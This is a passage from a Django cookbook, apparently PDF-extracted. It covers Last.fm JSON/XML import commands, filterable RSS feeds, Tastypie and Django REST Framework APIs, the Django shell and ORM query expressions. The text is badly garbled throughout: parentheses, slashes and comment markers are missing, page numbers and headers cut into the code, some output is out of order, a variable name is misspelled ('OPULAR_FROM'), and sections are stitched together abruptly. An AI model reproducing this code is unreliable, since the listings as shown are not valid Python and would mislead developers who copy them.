As the list is paginated, we will add the save_page   method to the Command class  to save a single page of tracks. This method takes the dictionary with the top tracks  from a single page as a parameter, as follows:     def save_page self, d :         for track_dict in d["tracks"]["track"]:             track, created = Track.objects.get_or_create                  name=force_text track_dict["name"] ,                 artist=force_text                      track_dict["artist"]["name"]                  ,                 url=force_text track_dict["url"] ,                           image_dict = track_dict.get "image", None              if created and image_dict:                 image_url = image_dict[1]["text"]                 image_response = requests.get image_url                  track.image.save                      os.path.basename image_url ,                     File StringIO image_response.content                                 if self.verbosity >= NORMAL:                 self.stdout.write " - {} - {}".format                      track.artist, track.name                     4.  To run the import, call the following in the command line:   myproject_env $ python manage.py \  import_music_from_lastfm_as_json --max_pages=3  407  Chapter 9   How it works... The optional named max_pages argument limits the imported data to three pages. Just skip  it if you want to download all the available top tracks; however, beware that there are above  26,000 pages as detailed in the totalPages value and this will take a while.  Using the requests.get   method, we read the data from Last.fm, passing the params  query parameters. The response object has a built-in method called json  , which converts  a JSON string and returns a parsed dictionary.  We read the total pages value from this dictionary and then save the first page of results.  Then, we get the second and later pages one by one and save them. One interesting part  in the import is downloading and saving the image. Here, we also use request.get   to  retrieve the image data and then we pass it to File through StringIO, which is accordingly  used in the image.save   method. The first parameter of image.save   is a filename that  will be overwritten anyway by the value from the upload_to function and is necessary only  for the file extension.

In this  recipe, I will show you how to do this.  Getting ready To prepare importing top tracks from Last.fm in the XML format, follow these steps:  1.  Start with the first three steps from the Getting ready section in the Importing data   from an external JSON file recipe.  2.  Then, let's check the structure of the XML endpoint  http:    ws.audioscrobbler.com 2.0 ?method=tag. gettoptracks&tag=disco&api_key=xxx&format=xml , as follows:       <tracks tag="disco" page="1" perPage="50" totalPages="26205"  total="1310249">              Billie Jean         293   408  Data Import and Export          f980fc14-e29b-481d-ad3a-5ed9b4ab6340         http:  www.last.fm music Michael+Jackson _  Billie+Jean         0                   Michael Jackson           f27ec8db-af05-4f36-916e-3d57f91ecf5e           http:  www.last.fm music Michael+Jackson                 http:  img2-ak.lst.fm i u 34s 114a4599f3 bd451ca915f482345bc70f.png         http:  img2-ak.lst.fm i u 64s 114a4599f 3bd451ca915f482345bc70f.png         http:  img2-ak.lst.fm i u 174s 114a4599f 3bd451ca915f482345bc70f.png         http:  img2-ak.lst.fm i u 300x300 1 14a4599f3bd451ca915f482345bc70f.png            ...        How to do it... Execute the following steps one by one to import the top tracks from Last.fm in the   XML format:  1.  Create a music app with a Track model similar to the previous recipe, if you've not   already done this.  2.  Then, create an import_music_from_lastfm_as_xml.py management   command. We will be using the ElementTree XML API that comes with Python   to parse the XML nodes, as follows:  music management commands import_music_from_lastfm_as_xml.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os import requests from xml.etree import ElementTree from StringIO import StringIO from django.utils.six.moves import range from django.core.management.base import BaseCommand from django.utils.encoding import force_text from django.conf import settings from django.core.files import File  409  Chapter 9   from music.models import Track  SILENT, NORMAL, VERBOSE, VERY_VERBOSE = 0, 1, 2, 3  class Command BaseCommand :     help = "Imports top tracks from last.fm as XML."      def add_arguments self, parser :          Named  optional  arguments         parser.add_argument              "--max_pages",             type=int,             default=0,                def handle self, *args, **options :         self.verbosity = options.get "verbosity", NORMAL          max_pages = options["max_pages"]          params = {             "method": "tag.gettoptracks",             "tag": "disco",             "api_key": settings.LAST_FM_API_KEY,             "format": "xml",         }          r = requests.get              "http:  ws.audioscrobbler.com 2.0 ",             params=params                    root = ElementTree.fromstring r.content          total_pages = int              root.find "tracks" .attrib["totalPages"]                   if max_pages > 0:             total_pages = max_pages          if self.verbosity >= NORMAL:             self.stdout.write "=== Tracks imported ==="           self.save_page root          for page_number in range 2, total_pages + 1 :             params["page"] = page_number  410  Data Import and Export               r = requests.get                  "http:  ws.audioscrobbler.com 2.0 ",                 params=params                           root = ElementTree.fromstring r.content              self.save_page root   3.  As the list is paginated, we will add a save_page   method to the Command class   to save a single page of tracks. This method takes the root node of the XML as a  parameter, as shown in the following:     def save_page self, root :         for track_node in root.findall "tracks track" :             track, created = Track.objects.get_or_create                  name=force_text                      track_node.find "name" .text                  ,                 artist=force_text                      track_node.find "artist name" .text                  ,                 url=force_text                      track_node.find "url" .text                  ,                           image_node = track_node.find                  "image[@size='medium']"                           if created and image_node is not None:                 image_response = \                     requests.get image_node.text                  track.image.save                      os.path.basename image_node.text ,                     File StringIO image_response.content                                 if self.verbosity >= NORMAL:                 self.stdout.write " - {} - {}".format                      track.artist, track.name                     4.  To run the import, call the following in the command line:   myproject_env $ python manage.py \  import_music_from_lastfm_as_xml --max_pages=3  411  Chapter 9   How it works... The process is analogous to the JSON approach. Using the requests.get   method, we  read the data from Last.fm, passing the query parameters as params. The XML content of  the response is passed to the ElementTree parser and the root node is returned.  The ElementTree nodes have the find   and findall   methods, where you can pass  XPath queries to filter out specific subnodes.  The following is a table of the available XPath syntax supported by ElementTree:  XPath Syntax Component tag * .     .. [@attrib] [@attrib='value']  [tag]  [position]  Meaning This selects all the child elements with the given tag. This selects all the child elements. This selects the current node. This selects all the subelements on all the levels beneath the  current element. This selects the parent element. This selects all the elements that have the given attribute. This selects all the elements for which the given attribute has  the given value. This selects all the elements that have a child named tag. Only  immediate children are supported. This selects all the elements that are located at the given  position. The position can either be an integer  1 is the first  position , the last  expression  for the last position , or a  position relative to the last position  for example, last  -1 .  Therefore, using root.find "tracks" .attrib["totalPages"], we read the total  amount of pages. We will save the first page and then go through the other pages one by   one and save them too.  In the save_page   method, root.findall "tracks track"  returns an  iterator through the   nodes under the   node. With track_node. find "image[@size='medium']" , we get the medium-sized image.

RSS and Atom feeds are XML documents with specific semantics. They can be  subscribed in an RSS reader such as Feedly or they can be aggregated in other websites,  mobile applications, or desktop applications. In this recipe, we will create BulletinFeed,  which provides a bulletin board with images. Moreover, the results will be filterable by URL  query parameters.  Getting ready Create a new bulletin_board app and put it under INSTALLED_APPS in the settings.  How to do it... We will create a Bulletin model and an RSS feed for it. We will be able to filter the RSS  feed by type or category so that it is possible to only subscribe to the bulletins that are, for  example, offering used books:  1.   In the models.py file of this app, add the Category and Bulletin models with a  foreign key relationship between them, as follows:  bulletin_board models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.core.urlresolvers import reverse from django.utils.encoding import \     python_2_unicode_compatible from utils.models import CreationModificationDateMixin from utils.models import UrlMixin  TYPE_CHOICES =        "searching", _ "Searching"  ,      "offering", _ "Offering"  ,    @python_2_unicode_compatible  413  Chapter 9   class Category models.Model :     title = models.CharField _ "Title" , max_length=200       def __str__ self :         return self.title      class Meta:         verbose_name = _ "Category"          verbose_name_plural = _ "Categories"   @python_2_unicode_compatible class Bulletin CreationModificationDateMixin, UrlMixin :     bulletin_type = models.CharField _ "Type" ,         max_length=20, choices=TYPE_CHOICES      category = models.ForeignKey Category,         verbose_name=_ "Category"        title = models.CharField _ "Title" , max_length=255      description = models.TextField _ "Description" ,         max_length=300       contact_person = models.CharField _ "Contact person" ,         max_length=255      phone = models.CharField _ "Phone" , max_length=50,         blank=True      email = models.CharField _ "Email" , max_length=254,         blank=True       image = models.ImageField _ "Image" , max_length=255,         upload_to="bulletin_board ", blank=True       class Meta:         verbose_name = _ "Bulletin"          verbose_name_plural = _ "Bulletins"          ordering =  "-created",       def __str__ self :         return self.title      def get_url_path self :         try:             path = reverse                  "bulletin_detail",                 kwargs={"pk": self.pk}  414  Data Import and Export                         except:              the apphook is not attached yet             return ""         else:             return path  2.  Then, create BulletinFilterForm that allows the visitor to filter the bulletins by   type and category, as follows:  bulletin_board forms.py  -*- coding: UTF-8 -*- from django import forms from django.utils.translation import ugettext_lazy as _ from models import Category, TYPE_CHOICES  class BulletinFilterForm forms.Form :     bulletin_type = forms.ChoiceField          label=_ "Bulletin Type" ,         required=False,         choices=  "", "---------" ,  + TYPE_CHOICES,           category = forms.ModelChoiceField          label=_ "Category" ,         required=False,         queryset=Category.objects.all  ,        3.  Add a feeds.py file with the BulletinFeed class, as shown in the following:   bulletin_board feeds.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib.syndication.views import Feed from django.core.urlresolvers import reverse from .models import Bulletin, TYPE_CHOICES from .forms import BulletinFilterForm  class BulletinFeed Feed :     description_template = \         "bulletin_board feeds bulletin_description.html"      def get_object self, request, *args, **kwargs :         form = BulletinFilterForm data=request.REQUEST          obj = {}         if form.is_valid  :  415  Chapter 9               obj = {                 "bulletin_type": \                     form.cleaned_data["bulletin_type"],                 "category": form.cleaned_data["category"],                 "query_string": \                     request.META["QUERY_STRING"],             }         return obj      def title self, obj :         t = "My Website - Bulletin Board"          add type "Searching" or "Offering"         if obj.get "bulletin_type", False :             tp = obj["bulletin_type"]             t += " - %s" % dict TYPE_CHOICES [tp]          add category         if obj.get "category", False :             t += " - %s" % obj["category"].title         return t      def link self, obj :         if obj.get "query_string", False :             return reverse "bulletin_list"  + "?" + \                 obj["query_string"]         return reverse "bulletin_list"       def feed_url self, obj :         if obj.get "query_string", False :             return reverse "bulletin_rss"  + "?" + \                 obj["query_string"]         return reverse "bulletin_rss"       def item_pubdate self, item :         return item.created      def items self, obj :         qs = Bulletin.objects.order_by "-created"          if obj.get "bulletin_type", False :             qs = qs.filter                  bulletin_type=obj["bulletin_type"],              .distinct           if obj.get "category", False :             qs = qs.filter   416  Data Import and Export                   category=obj["category"],              .distinct           return qs[:30]  4.  Create a template for the bulletin description that will be provided in the feed, as   shown in the following: { templates bulletin_board feeds bulletin_description.html } {% if obj.image %}       <img src="http:  {{ request. META.HTTP_HOST }}{{ obj.image.url }}" alt=""  >   {% endif %}  {{ obj.description }}   5.  Create a URL configuration for the bulletin board app and include it in the root URL   configuration, as follows:  templates bulletin_board urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import * from .feeds import BulletinFeed  urlpatterns = patterns "bulletin_board.views",     url r"^$", "bulletin_list", name="bulletin_list" ,     url r"^ ?P [0-9]+  $", "bulletin_detail",          name="bulletin_detail" ,     url r"^rss $", BulletinFeed  , name="bulletin_rss" ,    6.  You will also need the views and templates for the filterable list and details of the   bulletins. In the Bulletin list page template, add the following link: <a href="{% url "bulletin_rss" %}?{{ request.META.QUERY_STRING  }}">RSS Feed   How it works... Therefore, if you have some data in the database and you open http:  127.0.0.1:8000  bulletin-board rss ?bulletin_type=offering&category=4 in your browser, you  will get an RSS feed of bulletins with the Offering type and the 4 category ID.  The BulletinFeed class has the get_objects   method that takes the current  HttpRequest and defines the obj dictionary used in other methods of the same class.   The obj dictionary contains the bulletin type, category, and current query string.  417  Chapter 9   The title   method returns the title of the feed. It can either be generic or related to the  selected bulletin type or category. The link   method returns the link to the original bulletin  list with the filtering done. The feed_url   method returns the URL of the current feed. The  items   method does the filtering itself and returns a filtered QuerySet of bulletins. Finally,  the item_pubdate   method returns the creation date of the bulletin.  To see all the available methods and properties of the Feed class that we are extending, refer  to the following documentation at https:  docs.djangoproject.com en 1.8 ref  contrib syndication feed-class-reference.  The other parts of the code are self-explanatory.  See also   f The Creating a model mixin with URL-related methods recipe in Chapter 2,    Database Structure   f The Creating a model mixin to handle creation and modification dates recipe in   Chapter 2, Database Structure   f The Using Tastypie to create API recipe  Using Tastypie to create API Tastypie is a framework for Django to create web service Application Program Interface   API . It supports full GET POST PUT DELETE PATCH HTTP methods to deal with online  resources. It also supports different types of authentication and authorization, serialization,  caching, throttling, and so on. In this recipe, you will learn how to provide bulletins to third  parties for reading, that is, we will implement only the GET HTTP method.  Getting ready First of all, install Tastypie in your virtual environment using the following command:   myproject_env $ pip install django-tastypie  Add Tastypie to INSTALLED_APPS in the settings. Then, enhance the bulletin_board app  that we defined in the Creating filterable RSS feeds recipe.  418  Data Import and Export   How to do it... We will create an API for bulletins and inject it in the URL configuration as follows:  1.   In the bulletin_board app, create an api.py file with two resources,  CategoryResource and BulletinResource, as follows:  bulletin_board api.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from tastypie.resources import ModelResource from tastypie.resources import ALL, ALL_WITH_RELATIONS from tastypie.authentication import ApiKeyAuthentication from tastypie.authorization import DjangoAuthorization from tastypie import fields from .models import Category, Bulletin  class CategoryResource ModelResource :     class Meta:         queryset = Category.objects.all           resource_name = "categories"         fields = ["title"]         allowed_methods = ["get"]         authentication = ApiKeyAuthentication           authorization = DjangoAuthorization           filtering = {             "title": ALL,         }  class BulletinResource ModelResource :     category = fields.ForeignKey CategoryResource,         "category", full=True       class Meta:         queryset = Bulletin.objects.all           resource_name = "bulletins"         fields = [             "bulletin_type", "category", "title",             "description", "contact_person", "phone",             "email", "image"         ]         allowed_methods = ["get"]         authentication = ApiKeyAuthentication           authorization = DjangoAuthorization           filtering = {  419  Chapter 9               "bulletin_type": ALL,             "title": ALL,             "category": ALL_WITH_RELATIONS,         }  2.   In the main URL configuration, include the API URLs, as follows:  myproject urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, include, url from django.conf import settings from django.conf.urls.static import static from django.contrib.staticfiles.urls import \     staticfiles_urlpatterns  from django.contrib import admin admin.autodiscover    from tastypie.api import Api from bulletin_board.api import CategoryResource from bulletin_board.api import BulletinResource  v1_api = Api api_name="v1"  v1_api.register CategoryResource    v1_api.register BulletinResource     urlpatterns = patterns '',     url r"^admin ", include admin.site.urls  ,     url r"^api ", include v1_api.urls  ,    urlpatterns += staticfiles_urlpatterns   urlpatterns += static settings.MEDIA_URL,     document_root=settings.MEDIA_ROOT   420  Data Import and Export   3.  Create a Tastypie API key for the admin user in the model administration. To do this,   navigate to Tastypie  Api key  Add Api key, select the admin user, and save the  entry. This will generate a random API key, as shown in the following screenshot:  4.  Then, you can open this URL to see the JSON response in action  simply replace xxx  with your API key : http:  127.0.0.1:8000 api v1 bulletins ?format=js on&username=admin&api_key=xxx.  How it works... Each endpoint of Tastypie should have a class extending ModelResource defined. Similar  to the Django models, the configuration of the resource is set in the Meta class:   f The queryset parameter defines the QuerySet of objects to list.  f The resource_name parameter defines the name of the URL endpoint.  f The fields parameter lists out the fields of the model that should be shown in    the API.   f The allowed_methods parameter lists out the request methods, such as get,   post, put, delete, and patch.   f The authentication parameter defines how third parties can authenticate   themselves when connecting to the API. The available options are Authentication,  BasicAuthentication, ApiKeyAuthentication, SessionAuthentication,  DigestAuthentication, OAuthAuthentication, MultiAuthentication, or  your own custom authentication. In our case, we are using ApiKeyAuthentication  as we want each user to use username and api_key.  421  Chapter 9    f The authorization parameter answers the authorization question: is   permission granted to this user to take the stated action? The possible choices are  Authorization, ReadOnlyAuthorization, DjangoAuthorization, or your  own custom authorization. In our case, we are using ReadOnlyAuthorization as  we only want to allow read access to the users.   f The filtering parameter defines by which fields one can filter the lists in the URL   query parameters. For example, with the current configuration, you can filter the  items by titles that contain the word "movie": http:  127.0.0.1:8000 api  v1 bulletins ?format=json&username=admin&api_key=xxx&title__ contains=movie.  Also, there is a category foreign key that is defined in BulletinResource with the  full=True argument, meaning that the full list of category fields will be shown in the   bulletin resource instead of an endpoint link.  Besides JSON, Tastypie allows you to use other formats such as XML, YAML, and bplist.  There is a lot more that you can do with APIs using Tastypie. To find out more details, check  the official documentation at http:  django-tastypie.readthedocs.org en  latest .  See also   f The Creating filterable RSS feeds recipe  f The Using Django REST framework to create API recipe  Using Django REST framework to create API Besides Tastypie, there is a newer and fresher framework to create API for your data transfers  to and from third parties. That's Django REST Framework. This framework has more extensive  documentation and Django-ish implementation, it is also more maintainable. Therefore, if you  have to choose between Tastypie or Django REST Framework, I would recommend the latter  one. In this recipe, you will learn how to use Django REST Framework in order to allow your  project partners, mobile clients, or Ajax-based website to access data on your site to create,  read, update, and delete.  Getting ready First of all, install Django REST Framework and its optional dependencies in your virtual  environment using the following commands:   myproject_env $ pip install djangorestframework   myproject_env $ pip install markdown   myproject_env $ pip install django-filter  422  Data Import and Export   Add rest_framework to INSTALLED_APPS in the settings. Then, enhance the bulletin_ board app that we defined in the Creating filterable RSS feeds recipe.  How to do it... To integrate a new REST API in our bulletin_board app, execute the following steps:  1.  Add the specific configurations to the settings:   conf base.py or settings.py REST_FRAMEWORK = {     "DEFAULT_PERMISSION_CLASSES": [         "rest_framework.permissions."             "DjangoModelPermissionsOrAnonReadOnly"     ],     "DEFAULT_PAGINATION_CLASS": \         "rest_framework.pagination.LimitOffsetPagination",     "PAGE_SIZE": 100, }  2.   In the bulletin_board app, create the serializers.py file with the   following content:  bulletin_board serializers.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from rest_framework import serializers from .models import Category, Bulletin  class CategorySerializer serializers.ModelSerializer :     class Meta:         model = Category         fields = ["id", "title"]  class BulletinSerializer serializers.ModelSerializer :     category = CategorySerializer        class Meta:         model = Bulletin         fields = [             "id", "bulletin_type", "category", "title",             "description", "contact_person", "phone",             "email", "image"         ]      def create self, validated_data :  423  Chapter 9           category_data = validated_data.pop 'category'          category, created = Category.objects.\             get_or_create title=category_data['title']          bulletin = Bulletin.objects.create              category=category, **validated_data                   return bulletin      def update self, instance, validated_data :         category_data = validated_data.pop 'category'          category, created = Category.objects.get_or_create              title=category_data['title'],                   for fname, fvalue in validated_data.items  :             setattr instance, fname, fvalue          instance.category = category         instance.save           return instance  3.  Add two new class-based views to the views.py file in the bulletin_board app:   bulletin_board views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from rest_framework import generics  from .models import Bulletin from .serializers import BulletinSerializer  class RESTBulletinList generics.ListCreateAPIView :     queryset = Bulletin.objects.all       serializer_class = BulletinSerializer  class RESTBulletinDetail      generics.RetrieveUpdateDestroyAPIView  :     queryset = Bulletin.objects.all       serializer_class = BulletinSerializer  4.  Finally, plug in the new views to the URL configuration:   myproject urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, include, url  424  Data Import and Export   from bulletin_board.views import RESTBulletinList from bulletin_board.views import RESTBulletinDetail  urlpatterns = [      ...     url          r"^api-auth ",         include "rest_framework.urls",         namespace="rest_framework"       ,     url          r"^rest-api bulletin-board $",         RESTBulletinList.as_view  ,         name="rest_bulletin_list"      ,     url          r"^rest-api bulletin-board  ?P [0-9]+  $",         RESTBulletinDetail.as_view  ,         name="rest_bulletin_detail"      , ]  How it works... What we created here is an API for the bulletin board, where one can read a paginated  bulletin list; create a new bulletin; and read, change, or delete a single bulletin by ID. Reading  is allowed without authentication; whereas, one has to have a user account with appropriate  permissions to add, change, or delete a bulletin.  Here's how you can approach the created API:  URL http:  127.0.0.1:8000 rest-api  bulletin-board  http:  127.0.0.1:8000 rest-api  bulletin-board   HTTP Method GET  POST  http:  127.0.0.1:8000 rest-api  bulletin-board 1   GET  Description List bulletins paginated by  100 Create a new bulletin if  the requesting user is  authenticated and authorized  to create bulletins Get a bulletin with the 1 ID  425  Chapter 9   URL http:  127.0.0.1:8000 rest-api  bulletin-board 1   HTTP Method PUT  http:  127.0.0.1:8000 rest-api  bulletin-board 1   DELETE  Description Update a bulletin with  the 1 ID, if the user is  authenticated and authorized  to change bulletins Delete the bulletin with  the 1 ID, if the user is  authenticated and authorized  to delete bulletins  How to use the API practically? For example, if you have the requests library installed, you  can create a new bulletin in the Django shell as follows:   myproject_env $ python manage.py shell  >>> import requests  >>> response = requests.post "http:  127.0.0.1:8000 rest-api bulletin- board ", auth= "admin", "admin" , data={"title": "TEST", "category. title": "TEST", "contact_person": "TEST", "bulletin_type": "searching",  "description": "TEST"}   >>> response.status_code  201  >>> response.json    {u'category': {u'id': 6, u'title': u'TEST'}, u'description': u'TEST',  u'title': u'TEST', u'image': None, u'email': u'', u'phone': u'',  u'bulletin_type': u'searching', u'contact_person': u'TEST', u'id': 3}  426  Data Import and Export   Additionally, Django REST Framework provides you with a web-based API documentation that  is shown when you access the API endpoints in a browser. There you can also try out the APIs  by integrated forms, as shown in the following screenshot:  Let's take a quick look at how the code that we wrote works. In the settings, we have set the  access to be dependent on the permissions of the Django system. For anonymous requests,  only reading is allowed. Other access options include allowing any permission to everyone,  allowing any permission only to authenticated users, allowing any permission to staff users,  and so on. The full list can be found at http:  www.django-rest-framework.org  api-guide permissions .  Then, in the settings, pagination is set. The current option is to have the limit and offset  parameters like in an SQL query. Other options are to have either pagination by page numbers  for rather static content or cursor pagination for real-time data. We set the default pagination  to 100 items per page.  427  Chapter 9   Later we define serializers for categories and bulletins. They handle the data that will be shown  in the output or validated by the input. In order to handle category retrieval or saving, we had  to overwrite the create   and update   methods of BulletinSerializer. There are  various ways to serialize relations in Django REST Framework and we chose the most verbose  one in our example. To read more about how to serialize relations, refer to the documentation  at http:  www.django-rest-framework.org api-guide relations .  After defining the serializers, we created two class-based views to handle the API endpoints  and plugged them in the URL configuration. In the URL configuration, we have a rule     api-auth   for browsable API pages, login, and logout.

You will get an overview of how to use the Django  shell to experiment with the code before writing it in the files. You will be introduced to  monkey patching, also known as guerrilla patching, which is a powerful feature of dynamical  languages such as Python and Ruby. You will learn how to debug your code and check its  performance. You will see how to access the currently logged in user and other request  parameters from any module. Also, you will learn how to cache values, handle signals, and  create system checks. Get ready for an interesting programming experience!  429   Using the Django shell With the virtual environment activated and your project directory selected as the current  directory, enter the following command in your command-line tool:   myproject_env $ python manage shell  By executing the preceding command, you will get in an interactive Python shell configured  for your Django project, where you can play around with the code, inspect classes, try out  methods, or execute scripts on the fly. In this recipe, we will go through the most important  functions that you need to know in order to work with the Django shell.  Getting ready You can either install IPython or bpython using one of the following commands, which will  highlight the syntax for the output of your Django shell and add some other helpers:   myproject_env $ pip install ipython   myproject_env $ pip install bpython  How to do it... Learn the basics of using the Django shell by following these instructions:  1.  Run the Django shell by typing the following command:   myproject_env $ python manage.py shell  The prompt will change to In [1]: or >>>, depending on whether you use IPython  or not. If you use bpython, the shell will be shown in full terminal window with the  available shortcuts at the bottom  similar to the nano editor  and you will also get  code highlighting and text autocompletion when typing.  2.  Now, you can import classes, functions, or variables and play around with them. For  example, to see the version of an installed module, you can import the module and  then try to read its __version__, VERSION, or version variables, as follows: >>> import re  >>> re.__version__  '2.2.1'  3.  To get a comprehensive description of a module, class, function, method, keyword, or  documentation topic, use the help   function. You can either pass a string with the  path to a specific entity, or the entity itself, as follows: >>> help "django.forms"   430  Bells and Whistles   This will open the help page for the django.forms module. Use the arrow keys to  scroll the page up and down. Press Q to get back to the shell.  If you run help   without the parameters, it opens an interactive help.  Here you can enter any path of a module, class, function, and so on and  get information on what it does and how to use it. To quit the interactive  help press Ctrl + D.  4.  This is an example of passing an entity to the help   function. This will open a help   page for the ModelForm class, as follows: >>> from django.forms import ModelForm  >>> help ModelForm   5.  To quickly see what fields and values are available for a model instance, use the    __dict__ attribute. Also, use the pprint   function to get the dictionaries   printed in a more readable format  not just one long line , as shown in the following: >>> from pprint import pprint  >>> from django.contrib.contenttypes.models import ContentType  >>> pprint ContentType.objects.all  [0].__dict__   {'_state': <django.db.models.base.ModelState object at  0x10756d250>,   'app_label': u'bulletin_board',   'id': 11,   'model': u'bulletin',   'name': u'Bulletin'}  function, as follows: >>> dir ContentType     Note that using __dict__, we don't get many-to-many relationships. However, this  might be enough for a quick overview of the fields and values.  6.  To get all the available properties and methods of an object, you can use the dir     ['DoesNotExist', 'MultipleObjectsReturned', '__class__', '__ delattr__', '__dict__', '__doc__', '__eq__', '__format__',  '__getattribute__', '__hash__', '__init__', u'__module__', '__ ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__',  '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__ unicode__', '__weakref__', '_base_manager', '_default_manager',  '_deferred', '_do_insert', '_do_update', '_get_FIELD_display', '_ get_next_or_previous_by_FIELD', '_get_next_or_previous_in_order',  '_get_pk_val', '_get_unique_checks', '_meta', '_perform_date_ checks', '_perform_unique_checks', '_save_parents', '_save_table',  '_set_pk_val', '_state', 'app_label', 'clean', 'clean_fields',   431  Chapter 10   'content_type_set_for_comment', 'date_error_message', 'delete',  'full_clean', 'get_all_objects_for_this_type', 'get_object_for_ this_type', 'id', 'logentry_set', 'model', 'model_class', 'name',  'natural_key', 'objects', 'permission_set', 'pk', 'prepare_ database_save', 'save', 'save_base', 'serializable_value',  'unique_error_message', 'validate_unique']  To get these attributes printed one per line, you can use the following: >>> pprint dir ContentType      7.  The Django shell is useful to experiment with QuerySets or regular expressions   before putting them in your model methods, views, or management commands. For  example, to check the e-mail validation regular expression, you can type the following  in the Django shell: >>> import re  >>> email_pattern = re.compile r"[^@]+@[^@]+\.[^@]+"   >>> email_pattern.match "aidas@bendoraitis.lt"      8.   If you want to try out different QuerySets, you need to execute the setup of the  models and apps in your project, as shown in the following: >>> import django  >>> django.setup    >>> from django.contrib.auth.models import User  >>> User.objects.filter groups__name="Editors"   9.  To exit the Django shell, press Ctrl + D or type the following command:  [ ]  >>> exit    How it works... The difference between a normal Python shell and the Django shell is that when you run the  Django shell, manage.py sets the DJANGO_SETTINGS_MODULE environment variable to the  project's settings path, and then all the code in the Django shell is handled in the context of  your project.   f The Using database query expressions recipe  f The Monkey-patching the slugify   function for better internationalization support recipe  See also  432  Bells and Whistles   Using database query expressions Django Object-relational mapping  ORM  comes with special abstraction constructs that can  be used to build complex database queries. They are called Query Expressions and they allow  you to filter data, order it, annotate new columns, and aggregate relations. In this recipe, we  will see how that can be used in practice. We will create an app that shows viral videos and  counts how many times each video has been seen on mobile and desktop devices.  Getting ready To start with, install django-mobile to your virtual environment. This module will be  necessary to differentiate between desktop devices and mobile devices:   myproject_env $ pip install django-mobile  To configure it, you will need to modify several project settings as follows. Besides that, let's  create the viral_videos app. Put both of them under INSTALLED_APPS:   conf base.py or settings.py INSTALLED_APPS =        ...      third party     "django_mobile",       project-specific     "utils",     "viral_videos",    TEMPLATE_CONTEXT_PROCESSORS =        ...     "django_mobile.context_processors.flavour",    TEMPLATE_LOADERS =        ...     "django_mobile.loader.Loader",    MIDDLEWARE_CLASSES =        ...     "django_mobile.middleware.MobileDetectionMiddleware",     "django_mobile.middleware.SetFlavourMiddleware",    433  Chapter 10   Next, create a model for viral videos with a creation and modification timestamps, title,  embedded code, impressions on desktop devices, and impressions on mobile devices,   as follows:   viral_videos models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible from utils.models import CreationModificationDateMixin, UrlMixin  @python_2_unicode_compatible class ViralVideo CreationModificationDateMixin, UrlMixin :     title = models.CharField          _ "Title" , max_length=200, blank=True      embed_code = models.TextField _ "YouTube embed code" , blank=True      desktop_impressions = models.PositiveIntegerField          _ "Desktop impressions" , default=0      mobile_impressions = models.PositiveIntegerField          _ "Mobile impressions" , default=0       class Meta:         verbose_name = _ "Viral video"          verbose_name_plural = _ "Viral videos"       def __str__ self :         return self.title      def get_url_path self :         from django.core.urlresolvers import reverse         return reverse              "viral_video_detail",             kwargs={"id": str self.id }            How to do it... To illustrate the query expressions, let's create the viral video detail view and plug it in the URL  configuration, as shown in the following:  1.  Create the viral_video_detail   view in the views.py, as follows:   viral_videos views.py  -*- coding: UTF-8 -*-  434  Bells and Whistles   from __future__ import unicode_literals import datetime from django.shortcuts import render, get_object_or_404 from django.db import models from django.conf import settings from .models import ViralVideo  POPULAR_FROM = getattr      settings, "VIRAL_VIDEOS_POPULAR_FROM", 500    def viral_video_detail request, id :     yesterday = datetime.date.today   - \         datetime.timedelta days=1       qs = ViralVideo.objects.annotate          total_impressions=\             models.F "desktop_impressions"  + \             models.F "mobile_impressions" ,         label=models.Case              models.When                  total_impressions__gt=OPULAR_FROM,                 then=models.Value "popular"               ,             models.When                  created__gt=yesterday,                 then=models.Value "new"               ,             default=models.Value "cool" ,             output_field=models.CharField  ,          ,             DEBUG: check the SQL query that Django ORM generates     print qs.query       qs = qs.filter pk=id      if request.flavour == "mobile":         qs.update              mobile_impressions=\                 models.F "mobile_impressions"  + 1               else:         qs.update   435  Chapter 10               desktop_impressions=\                 models.F "desktop_impressions"  + 1                video = get_object_or_404 qs       return render          request,         "viral_videos viral_video_detail.html",         {'video': video}        2.  Define the URL configuration for the app, as shown in the following:   viral_videos urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import * urlpatterns = [     url          r"^ ?P \d+  ",         "viral_videos.views.viral_video_detail",         name="viral_video_detail"      , ]  3.   Include the URL configuration of the app in the project's root URL configuration,   as follows:  myproject urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import include, url from django.conf import settings from django.conf.urls.i18n import i18n_patterns  urlpatterns = i18n_patterns "",      ...     url r"^viral-videos ", include "viral_videos.urls"  ,    4.  Create a template for the viral_video_detail   view, as shown in the following:  { templates viral_videos viral_video_detail.html } {% extends "base.html" %}  436  Bells and Whistles   {% load i18n %}  {% block content %}      {{ video.title }}          {{ video.label }}             {{ video.embed_codesafe }}                 {% trans "Impressions" %}                         {% trans "Desktop impressions" %}:                 {{ video.desktop_impressions }}               {% trans "Mobile impressions" %}:                 {{ video.mobile_impressions }}               {% trans "Total impressions" %}:                 {{ video.total_impressions }}                  {% endblock %}  5.  Set up administration for the viral_videos app and add some videos to    the database.  How it works... You might have noticed the print   statement in the view. It is there temporarily for  debugging purposes. If you run local development server and access the first video in the  browser at http:  127.0.0.1:8000 en viral-videos 1 , you will see the following  SQL query printed in the console:  SELECT "viral_videos_viralvideo"."id", "viral_videos_ viralvideo"."created", "viral_videos_viralvideo"."modified", "viral_ videos_viralvideo"."title", "viral_videos_viralvideo"."embed_code",  "viral_videos_viralvideo"."desktop_impressions", "viral_videos_ viralvideo"."mobile_impressions",  "viral_videos_viralvideo"."desktop_ impressions" + "viral_videos_viralvideo"."mobile_impressions"  AS  "total_impressions", CASE WHEN  "viral_videos_viralvideo"."desktop_ impressions" + 